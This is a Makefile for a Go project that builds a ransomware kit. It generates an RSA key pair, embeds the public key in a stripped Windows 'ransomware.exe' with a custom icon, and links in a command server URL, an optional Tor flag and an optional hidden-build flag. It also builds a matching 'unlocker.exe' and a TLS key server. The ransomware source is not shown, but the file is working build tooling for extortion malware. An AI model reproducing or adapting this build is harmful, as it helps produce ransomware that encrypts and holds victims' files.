.PHONY: all deps

all: build clean

PROJECT_DIR=$(shell pwd)
BUILD_DIR=$(PROJECT_DIR)/build
BIN_DIR=$(PROJECT_DIR)/bin
SERVER_HOST?=localhost
SERVER_PORT?=8080
SERVER_URL=http://$(SERVER_HOST):$(SERVER_PORT)

LINKER_VARS=-X main.ServerBaseURL=$(SERVER_URL) -X main.UseTor=$(USE_TOR)

deps:
	go mod download
	env GO111MODULE=off go get -u github.com/akavel/rsrc \
		github.com/jteeuwen/go-bindata/...

pre-build: clean-bin
	mkdir -p $(BUILD_DIR)/ransomware $(BUILD_DIR)/unlocker $(BUILD_DIR)/server
	openssl genrsa -out $(BUILD_DIR)/server/private.pem 4096
	openssl rsa -in $(BUILD_DIR)/server/private.pem -outform PEM -pubout -out $(BUILD_DIR)/ransomware/public.pem
	cd $(BUILD_DIR)/ransomware && go-bindata -pkg main -o public_key.go public.pem
	rsrc -manifest ransomware.manifest -ico icon.ico -o $(BUILD_DIR)/ransomware/ransomware.syso
	cp $(BUILD_DIR)/ransomware/ransomware.syso $(BUILD_DIR)/unlocker/unlocker.syso
	cd $(PROJECT_DIR)/cmd && cp -r ransomware unlocker server $(BUILD_DIR)
	cd $(BUILD_DIR)/server && env GOOS=linux go run $(GOROOT)/src/crypto/tls/generate_cert.go --host $(SERVER_HOST)
	mkdir -p $(BIN_DIR)/server

build: pre-build
	cd $(BUILD_DIR)/ransomware && GOOS=windows GOARCH=386 go build --ldflags "-s -w $(HIDDEN) $(LINKER_VARS)" -o $(BIN_DIR)/ransomware.exe
	cd $(BUILD_DIR)/unlocker && GOOS=windows GOARCH=386 go build --ldflags "-s -w" -o $(BIN_DIR)/unlocker.exe
	cd $(BUILD_DIR)/server && go build --ldflags "-s -w" && mv `ls|grep -v 'server.go'` $(BIN_DIR)/server

clean:
	rm -r $(BUILD_DIR) || true

clean-bin:
	rm -r $(BIN_DIR) || true
